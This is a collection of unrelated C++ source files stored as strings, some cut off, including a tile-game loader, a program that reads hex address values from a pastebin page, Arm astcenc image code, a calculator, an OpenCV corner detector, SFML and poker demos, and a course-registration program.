    "#include \"extension.h\"\n\n#include <QDebug>\n\nstd::unique_ptr<Tuile> Extension::fabriqueTuile(\n    const std::array<string, 13>& m,\n    const std::vector<std::vector<unsigned int>>& l,\n    const string& chemin_,\n    bool blason,\n    bool auberge,\n    bool cathedrale) const {  // ajout de String chemin_\n  const auto& type = typeid(*this);\n\n  if (type == typeid(Base))\n    return std::make_unique<Tuile_Base>(m, l, blason, chemin_);  // ajout \ufffd chaque fois\n  if (type == typeid(Rivieres))\n    return std::make_unique<Tuile_Riviere>(m, l, blason, chemin_);\n  if (type == typeid(Auberges))\n    return std::make_unique<Tuile_Auberge>(m, l, blason, auberge, cathedrale, chemin_);\n  if (type == typeid(Abbes))\n    return std::make_unique<Tuile_Abbe>(m, l, blason, chemin_);\n  // if (type == typeid(Paysans))\n  //  return new Tuile_Paysan(m, l, blason, chemin_);\n  return nullptr;\n}\n\nvoid Extension::initialisation(const string& nom_fichier) {\n  QFile f(QString::fromStdString(nom_fichier));\n\n  string temp;\n\n    if(f.open(QIODevice::ReadOnly)){\n        QTextStream contenu(&f);\n        while (!contenu.atEnd()) {\n            temp = contenu.readLine().toStdString();\n\n            string tab_minituile;\n            string tab_liens;\n            string chemin;\n            string booleen;// ajout\n\n            size_t indice_fin_minituiles;\n            size_t indice_fin_liens;  // ajout\n            size_t indice_fin_chemin;\n            size_t indice_fin_booleen;\n\n            // isolement des deux donnees presentes dans une ligne\n            indice_fin_minituiles = temp.find(\")\");\n            indice_fin_liens = temp.find(\")\",indice_fin_minituiles + 1);\n            indice_fin_chemin = temp.find(\")\",indice_fin_liens + 1);\n            indice_fin_booleen = temp.find(\")\",indice_fin_chemin + 1);\n\n\n            //on recupere les elements interessants grace aux indices :\n            tab_minituile = temp.substr(1,indice_fin_minituiles - 1);\n            tab_liens = temp.substr(indice_fin_minituiles + 2, indice_fin_liens - indice_fin_minituiles - 2);\n            chemin = temp.substr(indice_fin_liens + 2, indice_fin_chemin - indice_fin_liens - 2);\n            booleen = temp.substr(indice_fin_chemin + 2, indice_fin_booleen - indice_fin_chemin - 2);\n\n            std::array<string, 13> minituiles;\n            size_t m = 0;\n\n            // insertion dans l'array minituiles les differentes informations presentes\n            // dans tab_minituile\n            for (string::iterator it = tab_minituile.begin(); it != tab_minituile.end();\n               it++) {\n            if (*it != ',') {\n              minituiles[m].push_back(*it);\n            } else {\n              m += 1;\n            }\n            }\n\n            std::vector<std::vector<unsigned int>> liens;\n            std::vector<unsigned int> v;\n\n            string nombre;\n\n            // insertion dans l'array lien les informations de la ligne\n            for (string::iterator it = tab_liens.begin(); it != tab_liens.end(); it++) {\n                if (*it <= '9' && *it >= '0') {\n                  nombre.push_back(*it);\n                }\n                else {\n                  v.push_back(stoi(nombre));\n                  nombre = \"\";\n                  if (*it != ',') {\n                    liens.push_back(v);\n                    v.clear();\n                  }\n                }\n            }\n            v.push_back(stoi(nombre));\n            liens.push_back(v);\n\n            //gestion des booleens\n            bool blason = false;\n            bool auberge = false;\n            bool cathedrale = false;\n\n            if(booleen.find(\"blason\") != string::npos){\n              blason = true;\n            }\n            if(booleen.find(\"auberge\") != string::npos){\n              auberge = true;\n            }\n            if(booleen.find(\"cathedrale\") != string::npos){\n              cathedrale = true;\n            }\n\n            auto tuile = fabriqueTuile(minituiles, liens, chemin, blason, auberge, cathedrale);  // ajout\n\n            if (tuile == nullptr) {\n                cout << \"ERREUR pointeur de tuile null\" << endl;\n                return;\n            }\n            tuiles.push_back(std::move(tuile));\n        }\n    } else {\n        throw std::runtime_error(\"Impossible d'ouvrir le fichier de tuiles\");\n    }\n}\n\n//EXTENSION\n\nstd::vector<std::unique_ptr<Pion>> Extension::creerPions(){\n    return doCreerPions();\n}\n\n// BASE\n\nstd::vector<std::unique_ptr<Pion>> Base::doCreerPions() {\n  std::vector<std::unique_ptr<Pion>> vect_pions;\n  for (int i = 0; i < 7; i++) {\n    auto p = make_unique<Simple>(Simple(0));\n    vect_pions.push_back(std::move(p));\n  }\n  return vect_pions;\n}\n\n//RIVIERE\n\n//AUBERGES\n\nstd::vector<std::unique_ptr<Pion>> Auberges::doCreerPions() {\n  std::vector<std::unique_ptr<Pion>> vect_pions;\n    auto p = make_unique<Grand>(Grand(0));\n    vect_pions.push_back(std::move(p));\n  return vect_pions;\n}\n\n//ABBES\n\nstd::vector<std::unique_ptr<Pion>> Abbes::doCreerPions() {\n  std::vector<std::unique_ptr<Pion>> vect_pions;\n    a",
    "#include <cstdio>\r\n#include <Windows.h>\r\n#include <string>\r\n#include <thread>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <regex> \r\n#include <sstream>\r\n\r\n// Networking\r\n#include <wininet.h>\r\n\r\n#pragma comment(lib, \"Wininet.lib\") \r\n\r\nstd::string url = \"https://pastebin.com/raw/tFpk49kq\"; \r\n\r\nDWORD GetAddress(const std::string& varName) {\r\n    HINTERNET Internet = InternetOpen(\"HTTP GET\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\r\n    if (Internet) {\r\n        HINTERNET URL = InternetOpenUrl(Internet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);\r\n        if (URL) {\r\n            char buffer[1024];\r\n            DWORD bytesRead = 0;\r\n            std::string Data;\r\n\r\n            while (InternetReadFile(URL, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\r\n                Data.append(buffer, bytesRead);\r\n            }\r\n\r\n            InternetCloseHandle(URL);\r\n\r\n            std::regex pattern(varName + R\"(\\s*=\\s*0x([0-9A-Fa-f]+))\");\r\n            std::smatch match;\r\n\r\n            if (std::regex_search(Data, match, pattern)) {\r\n                DWORD address;\r\n                std::stringstream(match.str(1)) >> std::hex >> address;\r\n                return address;\r\n            }\r\n            else {\r\n                return 0;\r\n            }\r\n        }\r\n        else {\r\n            return 0;\r\n        }\r\n\r\n        InternetCloseHandle(Internet);\r\n    }\r\n    else {\r\n        return 0;\r\n    }\r\n    \r\n}\r\n\r\nint main() {\r\n\r\n    printf(\"Address 0x%lx\\n\", GetAddress(\"Address\"));\r\n    printf(\"NewAddress 0x%lx\\n\", GetAddress(\"NewAddress\"));\r\n    printf(\"NULL 0x%lx\\n\", GetAddress(\"NULL\"));\r\n\r\n    return 0;\r\n}",
    "// SPDX-License-Identifier: Apache-2.0\n// ----------------------------------------------------------------------------\n// Copyright 2011-2022 Arm Limited\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n// use this file except in compliance with the License. You may obtain a copy\n// of the License at:\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n// WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n// License for the specific language governing permissions and limitations\n// under the License.\n// ----------------------------------------------------------------------------\n\n#if !defined(ASTCENC_DECOMPRESS_ONLY)\n\n/**\n * @brief Functions to calculate variance per component in a NxN footprint.\n *\n * We need N to be parametric, so the routine below uses summed area tables in order to execute in\n * O(1) time independent of how big N is.\n *\n * The addition uses a Brent-Kung-based parallel prefix adder. This uses the prefix tree to first\n * perform a binary reduction, and then distributes the results. This method means that there is no\n * serial dependency between a given element and the next one, and also significantly improves\n * numerical stability allowing us to use floats rather than doubles.\n */\n\n#include \"astcenc_internal.h\"\n\n#include <cassert>\n\n/**\n * @brief Generate a prefix-sum array using the Brent-Kung algorithm.\n *\n * This will take an input array of the form:\n *     v0, v1, v2, ...\n * ... and modify in-place to turn it into a prefix-sum array of the form:\n *     v0, v0+v1, v0+v1+v2, ...\n *\n * @param d      The array to prefix-sum.\n * @param items  The number of items in the array.\n * @param stride The item spacing in the array; i.e. dense arrays should use 1.\n */\nstatic void brent_kung_prefix_sum(\n\tvfloat4* d,\n\tsize_t items,\n\tint stride\n) {\n\tif (items < 2)\n\t\treturn;\n\n\tsize_t lc_stride = 2;\n\tsize_t log2_stride = 1;\n\n\t// The reduction-tree loop\n\tdo {\n\t\tsize_t step = lc_stride >> 1;\n\t\tsize_t start = lc_stride - 1;\n\t\tsize_t iters = items >> log2_stride;\n\n\t\tvfloat4 *da = d + (start * stride);\n\t\tptrdiff_t ofs = -static_cast<ptrdiff_t>(step * stride);\n\t\tsize_t ofs_stride = stride << log2_stride;\n\n\t\twhile (iters)\n\t\t{\n\t\t\t*da = *da + da[ofs];\n\t\t\tda += ofs_stride;\n\t\t\titers--;\n\t\t}\n\n\t\tlog2_stride += 1;\n\t\tlc_stride <<= 1;\n\t} while (lc_stride <= items);\n\n\t// The expansion-tree loop\n\tdo {\n\t\tlog2_stride -= 1;\n\t\tlc_stride >>= 1;\n\n\t\tsize_t step = lc_stride >> 1;\n\t\tsize_t start = step + lc_stride - 1;\n\t\tsize_t iters = (items - step) >> log2_stride;\n\n\t\tvfloat4 *da = d + (start * stride);\n\t\tptrdiff_t ofs = -static_cast<ptrdiff_t>(step * stride);\n\t\tsize_t ofs_stride = stride << log2_stride;\n\n\t\twhile (iters)\n\t\t{\n\t\t\t*da = *da + da[ofs];\n\t\t\tda += ofs_stride;\n\t\t\titers--;\n\t\t}\n\t} while (lc_stride > 2);\n}\n\n/* See header for documentation. */\nvoid compute_pixel_region_variance(\n\tastcenc_contexti& ctx,\n\tconst pixel_region_args& arg\n) {\n\t// Unpack the memory structure into local variables\n\tconst astcenc_image* img = arg.img;\n\tastcenc_swizzle swz = arg.swz;\n\tbool have_z = arg.have_z;\n\n\tint size_x = arg.size_x;\n\tint size_y = arg.size_y;\n\tint size_z = arg.size_z;\n\n\tint offset_x = arg.offset_x;\n\tint offset_y = arg.offset_y;\n\tint offset_z = arg.offset_z;\n\n\tint alpha_kernel_radius = arg.alpha_kernel_radius;\n\n\tfloat*   input_alpha_averages = ctx.input_alpha_averages;\n\tvfloat4* work_memory = arg.work_memory;\n\n\t// Compute memory sizes and dimensions that we need\n\tint kernel_radius = alpha_kernel_radius;\n\tint kerneldim = 2 * kernel_radius + 1;\n\tint kernel_radius_xy = kernel_radius;\n\tint kernel_radius_z = have_z ? kernel_radius : 0;\n\n\tint padsize_x = size_x + kerneldim;\n\tint padsize_y = size_y + kerneldim;\n\tint padsize_z = size_z + (have_z ? kerneldim : 0);\n\tint sizeprod = padsize_x * padsize_y * padsize_z;\n\n\tint zd_start = have_z ? 1 : 0;\n\n\tvfloat4 *varbuf1 = work_memory;\n\tvfloat4 *varbuf2 = work_memory + sizeprod;\n\n\t// Scaling factors to apply to Y and Z for accesses into the work buffers\n\tint yst = padsize_x;\n\tint zst = padsize_x * padsize_y;\n\n\t// Scaling factors to apply to Y and Z for accesses into result buffers\n\tint ydt = img->dim_x;\n\tint zdt = img->dim_x * img->dim_y;\n\n\t// Macros to act as accessor functions for the work-memory\n\t#define VARBUF1(z, y, x) varbuf1[z * zst + y * yst + x]\n\t#define VARBUF2(z, y, x) varbuf2[z * zst + y * yst + x]\n\n\t// Load N and N^2 values into the work buffers\n\tif (img->data_type == ASTCENC_TYPE_U8)\n\t{\n\t\t// Swizzle data structure 4 = ZERO, 5 = ONE\n\t\tuint8_t data[6];\n\t\tdata[ASTCENC_SWZ_0] = 0;\n\t\tdata[ASTCENC_SWZ_1] = 255;\n\n\t\tfor (int z = zd_start; z < padsize_z; z++)\n\t\t{\n\t\t\tint z_src = (z - zd_start) + offset_z - kernel_radius_z;\n\t\t\tz_src = astc::clamp(z_src, 0, static_cast<int>(img->dim_z - 1));\n\t\t\tuint8_t* data8 = static_cast<uint8_t*>(img->data[z_src]);\n\n\t\t\tfor (int y = 1; y < padsize_y; y++)\n\t\t\t{",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\ntemplate <typename T>\nvoid view(const T& text, bool new_line = false) {\n    if (new_line) {\n        cout << text << endl;\n    }else {\n        cout << text;\n    }\n    \n}\n\nvoid GetUserNumbers(double& FirstNumber, double& SecondNumber) {\n    view(\"\u0412\u0432\u0435\u0434\u0438 \u043f\u0435\u0440\u0432\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n    cin >> FirstNumber;\n    view(\"\u0412\u0432\u0435\u0434\u0438 \u0432\u0442\u043e\u0440\u043e\u0435 \u0447\u0438\u0441\u043b\u043e: \");\n    cin >> SecondNumber;\n}\n\nvoid ProcessNumber(char Method, double FirstNumber, double SecondNumber) {\n    switch (Method) {\n\n    case '+':\n        view(\"\u041e\u0442\u0432\u0435\u0442: \" + to_string(FirstNumber + SecondNumber),true);\n        break;\n    case '-':\n        view(\"\u041e\u0442\u0432\u0435\u0442: \" + to_string(FirstNumber - SecondNumber), true);\n        break;\n    case '*':\n        view(\"\u041e\u0442\u0432\u0435\u0442: \" + to_string(FirstNumber * SecondNumber),true);\n        break;\n    case '/':\n        if (SecondNumber != 0) {\n            view(\"\u041e\u0442\u0432\u0435\u0442: \" + to_string(FirstNumber / SecondNumber),true);\n        }\n        else {\n            view(\"ERR: \u0414\u0435\u043b\u0435\u043d\u0438\u0435 \u043d\u0430 \u043d\u043e\u043b\u044c!\", true);\n        }\n        break;\n    default:\n        view(\"ERR: \u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u0430\u044f \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f\", true);\n        break;\n    }\n\n}\n\nvoid ProcessMethod(char& Method) {\n    \n    view(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434 \u0438\u0437 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 (+, -, *, /) >>> \");\n    cin >> Method;\n}\n\n\n\n\nint main() {\n    setlocale(LC_ALL, \"RU\");\n    double FirstNumber{};\n    double SecondNumber{};\n    char Method{};\n    char waiter;\n\n    while (true) {\n        GetUserNumbers(FirstNumber, SecondNumber);\n        ProcessMethod(Method);\n        ProcessNumber(Method, FirstNumber, SecondNumber);\n        system(\"pause\");\n\n        system(\"cls\");\n\n\n\n    }\n}\n",
    "/*\nTejasri Kasturi & Veditha Gudapati\nCS 5330 Computer Vision\nSpring 2024\nProject 4\n\nThis file contains the implementation of Harris corners\n*/\n\n\n\n#include <opencv2/opencv.hpp> // Include OpenCV library\n#include <iostream>           // Include input/output stream library\n\nusing namespace cv;  // Using OpenCV namespace\nusing namespace std; // Using standard namespace for C++\n\nint main()\n{\n    // Open the default camera\n    VideoCapture capture(0); // Initialize a VideoCapture object with default camera index\n    if (!capture.isOpened())\n    {                                                   // Check if camera is opened successfully\n        cerr << \"Error: Failed to open camera\" << endl; // Display error message if camera failed to open\n        return -1;                                      // Return with error code\n    }\n\n    // Create a window to display the detected corners\n    namedWindow(\"Detected Corners\", WINDOW_NORMAL); // Create a window with resizable option\n    resizeWindow(\"Detected Corners\", 800, 600);     // Resize the window to specific dimensions\n\n    Mat frame, gray; // Declare Mat objects for storing frames and grayscale images\n    while (true)\n    {\n        // Capture frame from the camera\n        capture >> frame;  // Capture frame from the camera\n        if (frame.empty()) // Check if the frame is empty\n            break;         // Break the loop if frame is empty\n\n        // Convert frame to grayscale\n        cvtColor(frame, gray, COLOR_BGR2GRAY); // Convert BGR image to grayscale\n\n        // Detect Harris corners\n        Mat dst, dst_norm;                                   // Declare Mat objects for storing corner detection results\n        int blockSize = 2;                                   // Size of the neighborhood considered for corner detection\n        int apertureSize = 3;                                // Aperture parameter for the Sobel operator\n        double k = 0.04;                                     // Harris detector free parameter\n        cornerHarris(gray, dst, blockSize, apertureSize, k); // Apply Harris corner detection algorithm\n\n        // Normalize\n        normalize(dst, dst_norm, 0, 255, NORM_MINMAX, CV_32FC1, Mat()); // Normalize the output of Harris corner detection\n        convertScaleAbs(dst_norm, dst_norm);                            // Convert the normalized image to 8-bit unsigned integer format\n\n        // Use goodFeaturesToTrack to actually find the corners\n        vector<Point2f> corners;                           // Declare a vector to store detected corner points\n        goodFeaturesToTrack(gray, corners, 500, 0.01, 10); // Apply the Shi-Tomasi corner detection algorithm to find good features\n\n        // Draw circles around detected corners\n        for (size_t i = 0; i < corners.size(); ++i)\n        {                                                             // Loop through all detected corners\n            circle(frame, corners[i], 5, Scalar(0, 255, 0), 2, 8, 0); // Draw a green circle around each detected corner\n        }\n\n        // Display the frame with detected corners\n        imshow(\"Detected Corners\", frame); // Display the frame with detected corners in the window\n\n        // Check for the 'h' key press to print the number of corners\n        char key = waitKey(30); // Wait for a key press for 30 milliseconds\n        if (key == 'h')\n        {                                                                     // Check if 'h' key is pressed\n            cout << \"Number of corners detected: \" << corners.size() << endl; // Print the number of detected corners\n        }\n\n        // Check for the Esc key press to exit\n        if (key == 27) // Check if Esc key is pressed\n            break;     // Break the loop if Esc key is pressed\n    }\n\n    return 0; // Return with success code\n}\n",
    "#include \"text_formatter.h\"\r\nint main()\r\n{\r\n    setlocale(LC_CTYPE, \"rus\");\r\n    fin.open(filename, ios::binary);\r\n    while (!fin.eof())\r\n    {\r\n        char ch;\r\n        fin.get(ch);\r\n        if (!fin.eof()) textIn += ch;\r\n    }\r\n    fin.close();\r\n\r\n\r\n    auto it = textIn.begin();\r\n    textOut.insert(textOut.begin(), symbolsMatrix[1].begin(), symbolsMatrix[1].end());\r\n    textOut.append(\" \");\r\n    while (it != textIn.end())\r\n    {\r\n        textOut.append(1, *it);\r\n        if (textOut.back() == '.' || textOut.back() == '!' || textOut.back() == '?' || textOut.back() == ',')\r\n        {\r\n            int randNum = rand() % (randEnd - randStart + 1) + randStart;\r\n            textOut.append(\" \");\r\n            textOut.append(symbolsMatrix[randNum].begin(), symbolsMatrix[randNum].end());\r\n            textOut.append(\" \");\r\n        }\r\n        ++it;\r\n    }\r\n    \r\n    if (textOut == \"OwO \")\r\n    {\r\n        cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8 \u00f1\u00e2\u00ee\u00e9 \u00f2\u00e5\u00ea\u00f1\u00f2 \u00e2 \u00f4\u00e0\u00e9\u00eb \\\"textToFormat.txt\\\" UwU\" << endl;\r\n        int a;\r\n        cin >> a;\r\n        return 0;\r\n    }\r\n\r\n    fout.open(filename, ios::binary);\r\n    for (char ch : textOut)\r\n    {\r\n        fout.put(ch);\r\n    }\r\n    cout << \"\u00c2\u00f1\u00e5 \u00e3\u00ee\u00f2\u00ee\u00e2\u00ee! OwO\" << endl;\r\n    int a;\r\n    cin >> a;\r\n    return 0;\r\n}",
    "#include <SFML/Graphics.hpp>\n// the only necessary libray is SFML\n\n#define WIDTH 800\n#define HEIGHT 600\n\nint main() {\n    // renders window\n    sf::RenderWindow window(sf::VideoMode(WIDTH, HEIGHT), \"Rectangle\", sf::Style::Titlebar | sf::Style::Close);\n\n    // rectangle settings\n    float recWidth = 80.0;\n    float recHeight = 45.0;\n    \n    sf::RectangleShape rectangle(sf::Vector2f(recWidth, recHeight));\n    rectangle.setFillColor(sf::Color::Blue);\n    rectangle.setPosition( 0.45*WIDTH , 0.4625*HEIGHT );\n\n    float speed = 0.1f;             // rectangle speed\n    bool movingRight = true;        // flag for right movement\n    bool movingUp = true;           // flag for up movment\n    bool horizontalBounce = false; // flag for horizontal bounce\n    bool verticalBounce = false;    // vertical bounce\n\n    // Main loop\n    while (window.isOpen()) {\n        // events area\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n            if (event.type == sf::Event::KeyPressed) {\n                if (event.key.code == sf::Keyboard::Y) {\n                    horizontalBounce = true; // Set horizontal movement flag to true\n                    verticalBounce = false; // set vertical movement flag to false\n                }\n                if (event.key.code == sf::Keyboard::T) {\n                    horizontalBounce = false; // set horizontal to false\n                    verticalBounce = true;    // set vertical to true\n                }\n                if (event.key.code == sf::Keyboard::P || event.key.code == sf::Keyboard::O){\n                    verticalBounce = false;\n                    horizontalBounce = false;\n                }\n            }\n        }\n\n        if (!horizontalBounce && !verticalBounce) { // Normal movement\n\n            // Movement for W, A, S, D\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::A) && rectangle.getPosition().x > 0){\n                rectangle.move(-speed, 0.f); // move left\n            }\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::D) && rectangle.getPosition().x + rectangle.getSize().x < window.getSize().x){\n                rectangle.move(speed, 0.f); // move right\n            }\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::W) && rectangle.getPosition().y > 0) {\n                rectangle.move(0.f, -speed); // Move up\n            }\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::S) && rectangle.getPosition().y + rectangle.getSize().y < window.getSize().y) {\n                rectangle.move(0.f, speed); // Move down\n            }\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)){\n                window.close();     // closes the window\n            }\n\n\n            // color change\n\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left)){\n                rectangle.setFillColor(sf::Color::Green);\n            }\n            else if (sf::Keyboard::isKeyPressed(sf::Keyboard::Right)){\n                rectangle.setFillColor(sf::Color::Red);\n            }\n            else if (sf::Keyboard::isKeyPressed(sf::Keyboard::Up)){\n                rectangle.setFillColor(sf::Color::Yellow);\n            }\n            else if (sf::Keyboard::isKeyPressed(sf::Keyboard::Down)){\n                rectangle.setFillColor(sf::Color::Magenta);\n            }\n            else if (sf::Keyboard::isKeyPressed(sf::Keyboard::Space)){\n                rectangle.setFillColor(sf::Color::Blue);\n            }\n        }\n\n        else if (horizontalBounce){\n            if (movingRight){\n                if (rectangle.getPosition().x + rectangle.getSize().x >= window.getSize().x){   // checks if the rectangle passed the window border in x\n                    movingRight = false;    // changes to left movement\n                } else {\n                    rectangle.move(speed, 0.f); // if it didn't cross, keeps moving right\n                }\n            } else {\n                if (rectangle.getPosition().x <= 0){    // checks if the rectangle passed the window border in x\n                    movingRight = true; // if gets to the left border, changes to right movement\n                } else {\n                    rectangle.move(-speed, 0.f); // if not, keeps going left\n                }\n            }\n        }\n\n        else if (verticalBounce) {      // this works with the same principle as the horizontal bounce, except its vertical\n            if (movingUp){\n                if (rectangle.getPosition().y <= 0){\n                    movingUp = false;\n                } else {\n                    rectangle.move(0.f, -speed); // move up\n                }\n            } else {\n                if (rectangle.getPosition().y + rectangle.getSize().y >= window.getSize().y){\n                    movingUp = true;\n                } else {\n                    rectangle.move(0.f, speed); // move down\n                }\n            }\n        }\n\n        // Clear the window\n        win",
    "#include \"PokerTable.h\"\nPokerTable::PokerTable()\n{}\n\nPokerTable::PokerTable(const PokerTable& pt)\n{}\n\nPokerTable::~PokerTable()\n{}\n\n//\u684c\u9762\u603b\u7684\u5361\u724c\u6570\nint PokerTable::setcardtotalenum(uint32_t setcardtotalenum)  \n{\n\tif (setcardtotalenum <= 0)\n\t{\n\t\treturn -1;\n\t}\n\tthis->cardtotalenum = setcardtotalenum;\n\treturn 0;\n}\n\n\n//\u8bbe\u7f6e\u6251\u514b\u526f\u6570\nint PokerTable::setdecknum(uint32_t decknum)\n{\n\tif (decknum <= 0)\n\t{\n\t\treturn -1;\n\t}\n\tthis->decknum = decknum;\n\treturn 0;\n}\n\n//\u8bbe\u7f6e\u672a\u4f7f\u7528\u7684\u6251\u514b\u6570\u3002\nint PokerTable::setusedcardnum(uint32_t usedcardnum)  \n{\n\tif (usedcardnum <= 0)\n\t{\n\t\treturn -1;\n\t}\n\tthis->usedcardnum = usedcardnum;\n\n\n\n\treturn 0;\n}\n\n//\u83b7\u53d6\u684c\u9762\u7684\u5361\u724c\u6570\nuint32_t PokerTable::getcardtotalenum()\n{\n\treturn this->cardtotalenum;\n}\n\n//\u83b7\u53d6\u6251\u514b\u526f\u6570\nuint32_t PokerTable::getdecknum()\n{\n\treturn this->decknum;\n}\n\n//\u83b7\u53d6\u5df2\u7ecf\u6253\u51fa\u7684\u6251\u514b\u6570\nuint32_t PokerTable::getusedcardnum()\n{\n\treturn this->usedcardnum;\n}\n\n//\u83b7\u53d6\u684c\u9762\u7684\u5361\u724c\nstd::vector<Card> PokerTable::gettablecard()\n{\n\treturn this->tablecard;\n}\n\n//\u83b7\u53d6\u672a\u4f7f\u7528\u7684\u6251\u514b\nstd::stack<Card> PokerTable::getunusedcard()\n{\n\treturn this->unusedcard;\n}\n\nvoid PokerTable::showtablecard(std::vector<Card>& showtbcard, uint32_t cardnum)\n{\n\tfor(int i = 0; i<cardnum; ++i)\n\t{\n\t\tCard tmp_card = this->unusedcard.top();\n\t\tthis->unusedcard.pop();\n\t\tshowtbcard.push_back(tmp_card);\n\t}\n}\n\n//\u53d1\u724c,\u6bcf\u6b21\u8c03\u7528\u53d1\u4e00\u5f20\u724c\nCard PokerTable::dealingcard()\n{\n\tif (this->unusedcard.empty())\n\t{\n\t\t//LOG\n\t\tstd::cout << \"unusedcard is empty\" << std::endl;\n\t\t//TODO\n\t\t//NEED RETURN\n\t}else\n\t{\n\t\tCard tmp_card = this->unusedcard.top();\n\t\tthis->unusedcard.pop();\n\t\treturn tmp_card;\n\t}\n}\n\n//\u684c\u9762\u7684\u8d4c\u6ce8\n//TODO\uff1a\u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u8d22\u7269\u5e94\u8be5\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u7ba1\u7406\u7c7b\u3002\nuint32_t PokerTable::betting(uint32_t money)\n{\n\treturn this->tablemoney = this->tablemoney + money;\n}\n\n//\u6d17\u724c\nvoid PokerTable::shuffle()\n{\n\t//\u5224\u65ad\u662f\u5426\u662f\u7b2c\u4e00\u6b21\u73a9\u724c\n\tif (this->cardtotalenum != this->tablecard.size())\n\t{\n\t\tstd::cout << \"\u4e0d\u662f\u7b2c\u4e00\u6b21\u73a9\u724c\uff0c\u4e0d\u53ef\u4ee5\u6d17\u724c\" << std::endl;\n\t\t//TODO:LOG\n\t}\n\tstd::srand(static_cast<unsigned int>(std::time(nullptr)));\n\tstd::shuffle(this->initcard.begin(), this->initcard.end(), std::default_random_engine());\n\n\tthis->unusedcard = std::stack<Card>();\n\n\twhile (!this->unusedcard.empty()) {\n\t\tthis->unusedcard.pop();\n\t}\n\tfor (auto it = this->initcard.rbegin(); it != this->initcard.rend(); ++it) {\n\t\tthis->unusedcard.push(*it);\n\t}\n}\n\n\nvoid PokerTable::createonepoker()\n{\n\t//\u8fd9\u4e2afor\u5faa\u73af\u653e\u5230\u4e00\u4e2a\u51fd\u6570\u91cc\u66f4\u597d\n\tfor (Suit s : {Suit::CLUBS, Suit::DIAMONDS, Suit::HEARTS, Suit::SPADES})\n\t{\n\t\tfor (Rank r : {Rank::ACE, Rank::EIGHT, Rank::FIVE, Rank::FOUR, Rank::JACK,\n\t\t\tRank::KING, Rank::NINE, Rank::QUEEN, Rank::SEVEN, Rank::SIX, Rank::TEN,\n\t\t\tRank::THREE, Rank::TWO})\n\t\t{\n\t\t\tCard c(s, r);\n\t\t\tthis->initcard.push_back(c);\n\t\t}\n\t}\n}\n\n\n//\u83b7\u53d6\u6251\u514b\u526f\u6570\u540e\u521b\u5efa\u6251\u514b\nvoid PokerTable::createallpoker()\n{\n\tif (this->decknum <= 0)\n\t{\n\t\t//TODO:LOG\n\t\tstd::cout << \"\u8fd8\u6ca1\u6709\u521b\u5efa\u6251\u514b\" << std::endl;\n\t\treturn;\n\t}\n\tfor(int i = 1; i <= this->decknum ; i++)\n\t{ \n\t\tthis->createonepoker();\n\t}\n}",
    "#include <iostream>\r\n#include <conio.h>\r\n#include <string.h>\r\n#include <locale.h>\r\nusing namespace std;\r\n\r\nstruct cidade{\r\n\tint codCid;\r\n\tchar nomeCid[30];\r\n\tchar uf[2];\r\n};\r\n\r\nstruct curso{\r\n\tint codCurs;\r\n\tchar descCurs[30];\r\n\tfloat valorAula;\r\n};\r\n\r\nstruct instrutor{\r\n\tint codInst;\r\n\tchar nomeInst[30];\r\n\tchar ender[30];\r\n\tint codCid;\r\n};\r\n\r\nstruct aluno{\r\n\tint codAlu;\r\n\tchar nomeAlu[30];\r\n\tchar ender[30];\r\n\tint codCid;\r\n};\r\n\r\nstruct turma{\r\n\tint codTur;\r\n\tint codCurs;\r\n\tint codInst;\r\n\tint totPartic;\r\n\tint maxPartic;\r\n};\r\n\r\nstruct matricula{\r\n\tint codMatri;\r\n\tint codAlu;\r\n\tint codTur;\r\n\tint quantAulas;\r\n\tfloat valTot;\r\n};\r\n\r\nvoid lerCid(cidade ca[], int &cont);\r\nint checCodCid(cidade ca[], int numchecCid, int novoCodCid);\r\n\r\nvoid lerInst(instrutor ca[], int &cont, cidade structcidade[], int numeroCidCad);\r\nvoid lerAddInst(\r\n\tinstrutor ca[], \r\n\tint &cont, \r\n\tinstrutor instOrig[],\r\n\tint NumeroInstCad, \r\n\tcidade structcidade[], \r\n\tint numeroCidCad\r\n);\r\nint checCodInst(instrutor ca[], int numchecInst, int novoCodInst);\r\nvoid inclusaoInst(\r\n\tinstrutor original[], \r\n\tint contOri, \r\n\tinstrutor novo[], \r\n\tint contN, \r\n\tinstrutor addInst[], \r\n\tint &contAdd\r\n);\r\nint checInstValid(instrutor ca[], int numchecInst, int checCodInst, cidade cb[], int numchecCid);\r\n\r\nvoid lerCurs(curso ca[], int &cont);\r\n\r\nvoid lerTur(\r\n\tturma ca[], \r\n\tint &cont, \r\n\tcurso cursOrig[], \r\n\tint numeroCursCad, \r\n\tinstrutor instOrig[], \r\n\tint numeroInstCad,\r\n\tcidade cidadeOrig[], \r\n\tint numchecCid\r\n);\r\nvoid lerAddTur(\r\n\tturma ca[], \r\n\tint &cont,\r\n\tturma turmOrig[],\r\n\tint numeroTurmCad,\r\n\tcurso cursOrig[],\r\n\tint numeroCursCad, \r\n\tinstrutor instOrig[], \r\n\tint numeroInstCad,\r\n\tcidade cidadeOrig[], \r\n\tint numchecCid\r\n);\r\nint checCodTur(turma ca[], int numchecTur, int novoCodTur);\r\nvoid 